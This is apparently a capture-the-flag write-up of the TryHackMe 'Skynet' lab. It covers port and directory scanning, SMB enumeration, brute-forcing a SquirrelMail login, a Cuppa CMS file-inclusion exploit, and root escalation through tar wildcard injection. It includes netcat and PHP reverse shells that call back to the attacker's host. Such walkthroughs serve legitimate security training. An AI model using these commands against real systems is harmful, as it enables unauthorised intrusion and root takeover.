# [THM-Skynet](https://tryhackme.com/room/skynet) - Maxwell Caron

A vulnerable Terminator themed Linux machine.

## External

Inital `nmap` scan:
```
$ nmap -sC -sV -oN inital 10.10.146.95 -v

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP CAPA UIDL SASL AUTH-RESP-CODE RESP-CODES PIPELINING
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: SASL-IR OK capabilities LOGINDISABLEDA0001 IDLE more listed IMAP4rev1 LOGIN-REFERRALS have ENABLE LITERAL+ Pre-login post-login ID
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SKYNET<00>           Flags: <unique><active>
|   SKYNET<03>           Flags: <unique><active>
|   SKYNET<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2021-05-23T16:42:39-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-23T21:42:39
|_  start_date: N/A
```

Since we see that port `80` is open, lets do a gobuster scan for directories.

`gobuster` scan:
```
$ gobuster dir -u http://10.10.146.95/ -w /opt/directory-brute.txt 

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.146.95/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/directory-brute.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/23 14:51:13 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://10.10.146.95/admin/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.146.95/css/]  
/js                   (Status: 301) [Size: 309] [--> http://10.10.146.95/js/]   
/config               (Status: 301) [Size: 313] [--> http://10.10.146.95/config/]
/ai                   (Status: 301) [Size: 309] [--> http://10.10.146.95/ai/]    
/squirrelmail         (Status: 301) [Size: 319] [--> http://10.10.146.95/squirrelmail/]
/server-status        (Status: 403) [Size: 277]

===============================================================
2021/05/23 15:55:18 Finished
===============================================================
```

`nikto` scan:
```
$ nikto -h http://10.10.146.95/

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.146.95
+ Target Hostname:    10.10.146.95
+ Target Port:        80
+ Start Time:         2021-05-23 14:51:34 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 20b, size: 592bbec81c0b6, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Cookie SQMSESSID created without the httponly flag
+ OSVDB-3093: /squirrelmail/src/read_body.php: SquirrelMail found
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7890 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-05-23 15:15:31 (GMT-7) (1437 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

After both of these scans come back we only get `301` errors which means we are not authorizred to view them so lets move on to another port.

**SMB (PORT 445/139)**

Using `smbclient` with the `-L` paramerter we can list the shares that are available on the server.

```
$ smbclient -L \\\\10.10.146.95\\

Enter WORKGROUP\maxwell's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))

```

Two shares pop out to us, `anonymous` and `mylesdyson`.

```
$ smbclient \\\\10.10.146.95\\milesdyson

Enter WORKGROUP\maxwell's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Trying to connect to the `milesdyson` share with a blank password we get an access denied, lets try the other share.

```
$ smbclient \\\\10.10.146.95\\anonymous                                                                      
Enter WORKGROUP\maxwell's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 08:04:00 2020
  ..                                  D        0  Tue Sep 17 00:20:17 2019
  attention.txt                       N      163  Tue Sep 17 20:04:59 2019
  logs                                D        0  Tue Sep 17 21:42:16 2019

```
Entering a blank password gets us into the `anonymous` share. As we can see there is an `attention.txt` text file as well as a `logs` directory, inside of the `logs` directory there are 3 text files: 

```
smb: \> cd logs
smb: \logs\> ls 
  .                                   D        0  Tue Sep 17 21:42:16 2019
  ..                                  D        0  Thu Nov 26 08:04:00 2020
  log2.txt                            N        0  Tue Sep 17 21:42:13 2019
  log1.txt                            N      471  Tue Sep 17 21:41:59 2019
  log3.txt                            N        0  Tue Sep 17 21:42:16 2019
```

Although there are 3 text fies in here, we see that only 1 has actual contents inside of it, we know this because of the number of bytes displated to the left of the day of the week that the file was created. Using the `get` command we can download the `attention.txt` and `log1.txt` onto our machine.

Reading the contents of the files:

**attention.txt**:
```
$ cat attention.txt 

A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```
Looks like something has caused the employees to change their passwords also, it seems that `Miles Dyson` has sent this message, the send time his name has been mentioned, this might be a possible username.

**log1.txt**:
```     
terminator22596
terminator219
...
79terminator6
1996terminator
```

Reading this file, it looks like a password list to me, we might have to use this in the future.

## Web App

While messing around with the pop3 server, I looked back at my gobuster and nikto scans to see a `squirrelmail` directory, having seen this application before I know it is an email service.

Trying to navigate to the `/squirrelmail` directory still gives us a 301 error, **BUT** looking at our nikto scan it gives us a full path to a `read_body.php` page.

![HnQ19J3](https://user-images.githubusercontent.com/69171981/119408598-d5082b80-bc9a-11eb-8b3a-65ab407a1a21.png)

From this page we can go to the login page redirect.

![q6I1tYK](https://user-images.githubusercontent.com/69171981/119408636-e3564780-bc9a-11eb-9bac-c753d771754d.png)

Now we can use the `log1.txt` to try to bruteforce `miles` password. I decided to use burpsuite's intruder because the wordlist was very short.

![dJoUqil](https://user-images.githubusercontent.com/69171981/119408680-f36e2700-bc9a-11eb-8658-730046d14094.png)

After capturing the login request I right clicked and sent it to repeater, cleared all of the payload positions and set it to only the password field since that is the only field we want to bruteforce. After pasting the contents of `log1.txt` into the payload I started the attack.

But after running through the entire `log1.txt` file there were no results.

Re-reading some of the clues that we had found previously, I realized that miles' last name was referenced, so I decided to change the username from `miles` to `milesdyson` and running the attack again.

![ifRbwdu](https://user-images.githubusercontent.com/69171981/119408715-03860680-bc9b-11eb-8122-76be8a7e7998.png)

Looks like we got a response with a different length and status so lets check it out!

![i2ddXUm](https://user-images.githubusercontent.com/69171981/119408735-0e409b80-bc9b-11eb-9ce2-6ad60e73325c.png)

We're in!

The email with the subject of **Samba Password reset** sounds good to me so let's check that one out first.

![1d9EFmk](https://user-images.githubusercontent.com/69171981/119408764-1993c700-bc9b-11eb-8fac-60ff49608b77.png)

This email seems to give us miles' smb password

```
$ smbclient \\\\10.10.146.95\\milesdyson 

Enter WORKGROUP\maxwell's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Trying to connect to the `milesdyson` share we still get access denied. This is because we are trying to access it from my account not from `miles`. Using the `-U` parameter with smbclient will let us specify a user to login as.

```
$ smbclient \\\\10.10.146.95\\milesdyson -U milesdyson   

Enter WORKGROUP\milesdyson's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                                  D        0  Tue Sep 17 02:05:47 2019
  ..                                                 D        0  Tue Sep 17 20:51:03 2019
  Improving Deep Neural Networks.pdf                 N  5743095  Tue Sep 17 02:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf        N 12927230  Tue Sep 17 02:05:14 2019
  Convolutional Neural Networks-CNN.pdf              N 19655446  Tue Sep 17 02:05:14 2019
  notes                                              D        0  Tue Sep 17 02:18:40 2019
  Neural Networks and Deep Learning.pdf              N  4304586  Tue Sep 17 02:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 02:05:14 2019


```

Hidden under a bunch of random pdf's we see a `notes` directory.

```
smb: \> cd notes
smb: \notes\> ls
  .                                   D        0  Tue Sep 17 02:18:40 2019
  ..                                  D        0  Tue Sep 17 02:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 02:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 02:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 02:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 02:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 02:01:29 2019
  important.txt                       N      117  Tue Sep 17 02:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 02:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 02:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 02:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 02:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 02:01:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 02:01:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 02:01:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 02:01:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 02:01:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 02:01:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 02:01:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 02:01:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 02:01:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 02:01:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 02:01:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 02:01:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 02:01:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 02:01:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 02:01:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 02:01:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 02:01:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 02:01:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 02:01:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 02:01:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 02:01:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 02:01:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 02:01:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 02:01:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 02:01:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 02:01:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 02:01:29 2019
```
Once again, a lot of randomness but I see an `important.txt` let's download that one.

```
$ cat important.txt     

1. Add features to beta CMS /<REDACTED>
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

Line `1.` is very interesting, it seems to give us a hidden directory on the web page.

![W67t8DO](https://user-images.githubusercontent.com/69171981/119408798-26b0b600-bc9b-11eb-97b5-ef658f2e74e4.png)

Going to the directory we see that it is *Miles Dyson's Personal Page*. After looking through the source code and doing some steganography on the image there was nothing so, I decided to start up gobuster.

```
$ gobuster dir -u http://10.10.146.95/<REDACTED>/ -w /opt/directory-brute.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.146.95/45kra24zxs28v3yd/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/directory-brute.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/23 21:30:46 Starting gobuster in directory enumeration mode
===============================================================
/administrator        (Status: 301) [Size: 337] [--> http://10.10.146.95/<REDACTED>/administrator/]
```
We get a hit!

![WZaoXoE](https://user-images.githubusercontent.com/69171981/119408827-329c7800-bc9b-11eb-8cf1-565dfd67b360.png)

Once again we are greeted with a login page, this time for `Cuppa` cms. After a bit of research I found [this](https://www.exploit-db.com/exploits/25971) post on `exploit-db` for a <REDACTED> file inclusion exploit.

Reading through the post, we see that the vulnerability is inside of the `/alerts/alertConfigField.php` file combined with the `?urlConfig` parameter. According to the post, "User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output."

We can test this vulnerability by using some LFI techniques.

```
$ curl http://10.10.146.95/<REDACTED>/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

<script>
        function CloseDefaultAlert(){
                SetAlert(false, "", "#alert");
                setTimeout(function () {SetBlockade(false)}, 200);
        }
        function ShowAlert(){
                _width = '';
                _height = '';
                jQuery('#alert').animate({width:parseInt(_width), height:parseInt(_height), 'margin-left':-(parseInt(_width)*0.5)+20, 'margin-top':-(parseInt(_height)*0.5)+20 }, 300, "easeInOutCirc", CompleteAnimation);
                        function CompleteAnimation(){
                                jQuery("#btnClose_alert").css('visibility', "visible");
                                jQuery("#description_alert").css('visibility', "visible");
                                jQuery("#content_alert").css('visibility', "visible");
                        }
        }
</script>
<div class="alert_config_field" id="alert" style="z-index:;">
    <div class="btnClose_alert" id="btnClose_alert" onclick="javascript:CloseDefaultAlert();"></div>
        <div class="description_alert" id="description_alert"><b>Field configuration: </b></div>
    <div class="separator" style="margin-bottom:15px;"></div>
    <div id="content_alert" class="content_alert">
        root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash
dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:113:121::/var/spool/postfix:/bin/false
mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false
    </div>
</div>  
```

As we can see the file contents are embeded into the output, this means that this application is vulnerable. Knowing this we can make use of *<REDACTED> file inclusion* by starting a python http server and having the server get our `php-reverse-shell.php` onto the box.

```
$ nc -lnvp 9001
listening on [any] 9001 ... 
```
        
First set up a netcat listener on your attacking machine.

```
http://10.10.146.95/<REDACTED>/administrator/alerts/alertConfigField.php?urlConfig=http://<YOUR IP>:8000/php-reverse-shell.php
```

You can curl this or enter it straight into the address bar.

```      
connect to [<YOUR IP>] from (UNKNOWN) [10.10.146.95] 53430

Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux   
 00:38:45 up 1 min,  0 users,  load average: 0.60, 0.27, 0.10                                                      
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                              
/bin/sh: 0: can't access tty; job control turned off                                                               
$ whoami
www-data
```

We are now on the box.

## Internal

First I stablized my shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo; fg
export TERM=xterm
```

Now that we have a stable shell it is time to enumerate. We see that we are in the root of the file system running as the user `www-data`, I went to the `/home` directory to see if we access anything.

```
www-data@skynet:/home/milesdyson$ ls -al

total 36
drwxr-xr-x 5 milesdyson milesdyson 4096 Sep 17  2019 .
drwxr-xr-x 3 root       root       4096 Sep 17  2019 ..
lrwxrwxrwx 1 root       root          9 Sep 17  2019 .bash_history -> /dev/null
-rw-r--r-- 1 milesdyson milesdyson  220 Sep 17  2019 .bash_logout
-rw-r--r-- 1 milesdyson milesdyson 3771 Sep 17  2019 .bashrc
-rw-r--r-- 1 milesdyson milesdyson  655 Sep 17  2019 .profile
drwxr-xr-x 2 root       root       4096 Sep 17  2019 backups
drwx------ 3 milesdyson milesdyson 4096 Sep 17  2019 mail
drwxr-xr-x 3 milesdyson milesdyson 4096 Sep 17  2019 share
-rw-r--r-- 1 milesdyson milesdyson   33 Sep 17  2019 user.txt
```

Looks like we have access to `milesdyson`'s home directory, inside we see the `user.txt` that we can submit as well as his SMB share. The thing that sticks out to me the most is the folder owned by root with the name `backups`.

```
www-data@skynet:/home/milesdyson/backups$ ls -al

total 4584
drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root       root       4679680 May 24 15:28 backup.tgz
```

Inside of this folder we see a bash script as well as a tar achive file, lets cat out the file.

```
www-data@skynet:/home/milesdyson/backups$ cat backup.sh 

#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

The program is going to the `/var/www/html` directory, *a directory that we have access to* and archiving all of the files by using the wildcard `*` inside of the directory to this `backup.tgz` file using `tar`. 

Since this is a backup script I assume that it will be running automatically in some way, so lets check out `/etc/crontab`

```
# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

Now we see that the backup script is running every minute **AND** as root.

I started to research a few things and found [Tar Wildcard Injection](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) since we have access to read and write files in the `/var/www/html` directory we can create files with names of `tar`'s parameters and they will execute as `root`.

First lets start our netcat listener on our attacking machine

```
$ nc -lnvp 9002
```

After trying a few different reverse shells I noticed that the netcat one was the only one that worked so lets use that one.

```
www-data@skynet:/$ cd /var/www/html
www-data@skynet:/var/www/html$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh"-i 2>&1|nc <YOUR IP> 9002 >/tmp/f" > shell.sh
```

Now that we have created the payloat we need to make the file that will execute it.

```
www-data@skynet:/var/www/html$ echo "" > "--checkpoint-action=exec=sh shell.sh"
```

After about a minute or waiting, we get a connection.

```
$ nc -lnvp 9002
listening on [any] 9002 ...
connect to [<YOUR IP>] from (UNKNOWN) [10.10.182.3] 35740
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

Now that we are root we can read and sumbit the final flag!

```
# cd /root
# ls -la
total 28
drwx------  4 root root 4096 Sep 17  2019 .
drwxr-xr-x 23 root root 4096 Sep 18  2019 ..
lrwxrwxrwx  1 root root    9 Sep 17  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Sep 17  2019 .cache
drwxr-xr-x  2 root root 4096 Sep 17  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Sep 17  2019 root.txt
# cat root.txt
<REDACTED>
```

Thank you for joining me on my first offical write-up, I hope to make many more in the future :) 
